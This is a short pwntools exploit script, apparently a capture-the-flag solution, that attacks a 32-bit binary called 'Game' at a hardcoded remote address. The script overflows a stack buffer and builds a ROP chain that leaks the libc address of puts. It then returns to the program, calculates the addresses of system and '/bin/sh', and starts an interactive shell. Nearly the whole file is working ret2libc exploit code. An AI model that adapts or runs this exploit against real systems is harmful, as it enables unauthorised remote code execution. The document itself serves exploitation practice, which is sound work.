from pwn import *

s = remote('123.60.135.228', 2143)
elf = ELF('./Game')
# s = process('./Game')
l64 = lambda: u64(s.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
l32 = lambda: u32(s.recvuntil("\xf7")[-4:].ljust(4, b"\x00"))

s.sendlineafter('ame?', 'yes')
s.sendlineafter('learning?', 'yes')

rop = ROP('./Game')
rop.raw(b'A' * (0x6c + 4))
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
rop.call(puts_plt, [puts_got])
rop.call('star')  # 调用star函数，使程序重新运行
# 发送Payload并接收响应
s.sendlineafter('you!', rop.chain())

puts_addr = l32()
success(hex(puts_addr))  # 0xf7614cb0
system_addr = puts_addr - 0x24800
binsh = system_addr + 0x11e7db

rop = ROP('./Game')
rop.raw(b'A' * (0x6c + 4))
rop.call(system_addr, [binsh])
s.sendlineafter('you!', rop.chain())

s.interactive()
